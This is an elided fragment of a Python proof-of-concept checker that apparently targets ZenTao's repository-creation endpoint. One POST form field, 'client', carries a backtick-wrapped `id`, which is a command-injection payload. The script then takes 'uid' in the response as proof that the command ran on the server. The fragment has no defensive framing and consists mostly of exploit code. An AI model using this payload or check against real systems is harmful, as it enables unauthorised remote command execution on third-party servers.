...
def check(url):
    ...
    # url2 = url+'/index.php?m=block&f=printBlock&id=1&module=my'#非伪静态版本按照此格式传参
    ...
    data1 = 'product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=%60id%60&account=&password=&encrypt=base64&desc=&uid=63c00e3d20873'
    ...
    try:
        ...
        req3 = s.post(url3,data=data1,proxies=proxies,timeout=5,verify=False,headers=headers)
        req4 = s.post(url4,data=data2,proxies=proxies,timeout=5,verify=False,headers=headers)
        if 'uid' in req4.text:
            print(url,"")
            return True
